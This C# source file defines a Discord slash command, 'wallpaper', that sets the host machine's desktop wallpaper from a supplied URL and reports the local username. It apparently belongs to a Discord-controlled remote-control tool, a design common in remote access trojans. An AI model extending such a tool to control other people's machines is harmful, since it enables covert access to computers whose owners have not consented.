using Discord;
using Discord.WebSocket;
using Paroxysm.Discord.Commands.Models;
using Paroxysm.Hooks.Actions;
using Paroxysm.Tools;

namespace Paroxysm.Discord.Commands;

public class WallpaperCmd : ISlashCommand
{
    public SlashCommandOptions Options()
    {
        return new SlashCommandOptions
        {
            Name = "wallpaper",
            Description = "Zmienia tapete na wyznaczoną",
            Params = new SlashCommandOptionParams
            {
                Name = "url",
                Description = "Link do obrazu",
                Type = ApplicationCommandOptionType.String,
                IsRequired = true
            }
        };
    }

    public Embed Execute(SocketSlashCommandData? parameters)
    {
        if (parameters is null)
        {
            return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
                "Unknown option parameters.", Environment.UserName, null);
        }

        var url = parameters.Options.ElementAt(0).Value;
        return ChangeWallpaperAction.Follow(url as string).Result;
    }
}